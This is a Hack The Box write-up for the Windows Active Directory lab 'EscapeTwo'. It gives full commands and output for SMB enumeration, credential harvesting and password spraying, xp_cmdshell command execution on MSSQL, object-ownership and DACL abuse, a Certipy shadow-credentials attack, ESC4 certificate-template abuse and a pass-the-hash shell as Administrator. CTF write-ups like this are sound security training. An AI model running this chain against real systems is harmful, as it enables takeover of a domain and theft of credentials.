# EscapeTwo - HTB Write-up
<img src="https://labs.hackthebox.com/storage/avatars/d5fcf2425893a73cf137284e2de580e1.png" width="200" height="200">

As is common in real life Windows pentests, you will start this box with credentials for the following account:
- `rose` / `KxEPkKe6R8su`

## Initial portscan (version)
```shell
❯ yarbis scan ports tcp version
Yarbis: Running: sudo nmap -sCV -T5 --min-rate 5000 -p- 10.129.85.135 -oN /home/kali/WriteUps/HackTheBox/Machines/Easy/EscapeTwo/scans/tcp_version.log
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-08 18:09:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-03-08T18:11:26+00:00; -6h59m54s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-08T18:11:26+00:00; -6h59m53s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.85.135:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.85.135:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-03-08T18:11:26+00:00; -6h59m54s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-08T18:04:40
|_Not valid after:  2055-03-08T18:04:40
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-08T18:11:26+00:00; -6h59m54s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-03-08T18:11:26+00:00; -6h59m53s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49730/tcp open  msrpc         Microsoft Windows RPC
49749/tcp open  msrpc         Microsoft Windows RPC
65494/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -6h59m53s, deviation: 0s, median: -6h59m54s
| smb2-time: 
|   date: 2025-03-08T18:10:46
|_  start_date: N/A
```

### Port 445 - SMB/CIFS
```shell
445/tcp   open  microsoft-ds?

❯ nxc smb dc01.sequel.htb -u rose -p KxEPkKe6R8su --shares
SMB         10.129.85.135   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.85.135   445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
SMB         10.129.85.135   445    DC01             [*] Enumerated shares
SMB         10.129.85.135   445    DC01             Share                   Permissions     Remark
SMB         10.129.85.135   445    DC01             -----                   -----------     ------
SMB         10.129.85.135   445    DC01             Accounting Department   READ            
SMB         10.129.85.135   445    DC01             ADMIN$                                  Remote Admin
SMB         10.129.85.135   445    DC01             C$                                      Default share
SMB         10.129.85.135   445    DC01             IPC$                    READ            Remote IPC
SMB         10.129.85.135   445    DC01             NETLOGON                READ            Logon server share
SMB         10.129.85.135   445    DC01             SYSVOL                  READ            Logon server share
SMB         10.129.85.135   445    DC01             Users                   READ            
                                                                                                   
```

### Port 1433 - SQL
```shell
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.85.135:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.85.135:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

### Port 445 - SMB/CIFS
`❯ smbclient '//10.129.166.148/Accounting Department' -U rose`

Download `accounts.xlsx`. The file is corrupted so we need to unzip it and locate the `sharedStrings.xml` file to extract the row data.

- `angela@sequel.htb    // angela       // 0fwz7Q4mSpurIt99`
- `oscar@sequel.htb     // oscar        // 86LxLBMgEWaKUnBG`
- `kevin@sequel.htb     // kevin        // Md9Wlq1E5bZnVDVo`
- `sa@sequel.htb        // sa           // MSSQLP@ssw0rd!`

With the possible credentials found in the excel we can type them in txts and run nxc on them:

`❯ nxc smb sequel.htb -u content/users.txt -p content/passwords.txt --continue-on-success`
```shell
SMB         10.129.166.148  445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
```

## RCE mssqlclient xp_cmdshell as sql_svc

```shell
❯ impacket-mssqlclient 'sequel.htb/sa:MSSQLP@ssw0rd!@sequel.htb'
SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', '1' 
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> reconfigure
SQL (sa  dbo@master)> xp_cmdshell whoami
output           
--------------
sequel\sql_svc 
SQL (sa  dbo@master)> exec xp_cmdshell 'type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI'
output                                              
-------------------------------------------------   
...
SQLSVCACCOUNT="SEQUEL\sql_svc"                      
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"                                               
SAPWD="MSSQLP@ssw0rd!"                                                                  
```

Add the found password to `passwords.txt` and re-run `nxc` to bruteforce user/pass.

## Abusing ADCS

### Bloodhound - Dump AD
We can run Bloodhound to dump all AD.

### bloodyAD - Get writable AD objects
```shell
❯ bloodyAD --host $ip -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=sequel,DC=htb
permission: WRITE

distinguishedName: CN=Ryan Howard,CN=Users,DC=sequel,DC=htb
permission: WRITE

distinguishedName: CN=Certification Authority,CN=Users,DC=sequel,DC=htb
OWNER: WRITE
```

As you can see we can write into the CA object.

Let's try to modify the owner of the `ca_svc` to our ryan user.

### BloodyAD - Take ownership of ca_svc user object
```shell
❯ bloodyAD --host dc01.sequel.htb -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 set owner ca_svc ryan
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```
- The set owner command modifies the `nTSecurityDescriptor` of the `ca_svc` object, specifically the `Owner` field, to point to `ryan`.
- The owner of an object has implicit rights to modify the object's permissions (DACL - Discretionary Access Control List).

### DACLedit - Adding FullControl of ca_svc to ryan user
```shell
❯ impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan:WqSZAF6CysDQbGb3'
[*] DACL backed up to dacledit-20250308-221758.bak
[*] DACL modified successfully!
```
- This modifies the DACL of the `ca_svc` object to explicitly grant `ryan` the `FullControl` permission.
- `FullControl` includes all possible permissions, such as reading, writing, deleting, and modifying the object.

### Certipy-AD - Dump hashes & TGT ticket for user ca_svc
```shell
❯ certipy-ad shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -dc-ip $ip -ns $ip -target dc01.sequel.htb -account ca_svc
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '614c2a2b-4179-7d3b-1a76-e45b3d1bc831'
[*] Adding Key Credential with device ID '614c2a2b-4179-7d3b-1a76-e45b3d1bc831' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '614c2a2b-4179-7d3b-1a76-e45b3d1bc831' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

- `certipy-ad shadow auto`: We perform a "shadow credentials" attack. It abuses ADCS to add a `Key Credential` to the target user (`ca_svc`), which allows the attacker to authenticate as that user.

#### What Happens During the Attack?
1. **Generating a Certificate**:
   - Certipy generates a certificate for the attacker. This certificate is used to authenticate as the target user (`ca_svc`).

2. **Adding a Key Credential**:
   - Certipy adds a **Key Credential** to the `ca_svc` user object in Active Directory. This is done by modifying the `msDS-KeyCredentialLink` attribute of the user.
   - The Key Credential is essentially a public key that allows the attacker to authenticate as `ca_svc` using the corresponding private key.

3. **Authenticating as `ca_svc`**:
   - Using the certificate, Certipy authenticates as `ca_svc` and requests a Kerberos TGT (Ticket Granting Ticket) for the user.
   - The TGT is saved to a file (`ca_svc.ccache`), which can be used later to impersonate `ca_svc`.

4. **Retrieving the NT Hash**:
   - Certipy uses the TGT to request the NT hash for `ca_svc`.

5. **Restoring the Original Key Credentials**:
   - To avoid detection, Certipy restores the original `msDS-KeyCredentialLink` attribute for `ca_svc`, removing the attacker's Key Credential.


**Using this nt hash and ticket we can now take control of the ADCS and try to search for a vulnerable certificate.**

**Let's do it:**

```shell
❯ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad find -scheme ldap -k -debug -target dc01.sequel.htb -dc-ip $ip -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Domain retrieved from CCache: SEQUEL.HTB
[+] Username retrieved from CCache: ca_svc
[+] Trying to resolve 'dc01.sequel.htb' at '10.129.166.148'
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    CA Name                             : sequel-DC01-CA
    [...]
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

- ESC4 refers to a misconfiguration where the `Cert Publishers` group (or other low-privileged groups) has excessive permissions (e.g., `Write`, `FullControl`) on a certificate template. This allows members of the group to modify the template and potentially escalate privileges.

### Modify the vulnerable template
```shell
❯ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip $ip -target dc01.sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

### Request certificate for Administrator user
```shell
❯ certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -dc-ip $ip -template DunderMifflinAuthentication -upn Administrator@sequel.htb -ns $ip -dns $ip
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 25
[*] Got certificate with multiple identifications
    UPN: 'Administrator@sequel.htb'
    DNS Host Name: '10.129.166.148'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator_10.pfx'
```

### Get TGT ticket for Administrator user
```shell
❯ certipy-ad auth -pfx administrator_10.pfx -domain sequel.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Found multiple identifications in certificate
[*] Please select one:
    [0] UPN: 'Administrator@sequel.htb'
    [1] DNS Host Name: '10.129.166.148'
> 0
[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': ******************:******************
```

### SHELL :)
```shell
❯ evil-winrm -i $ip -u Administrator -H ******************
```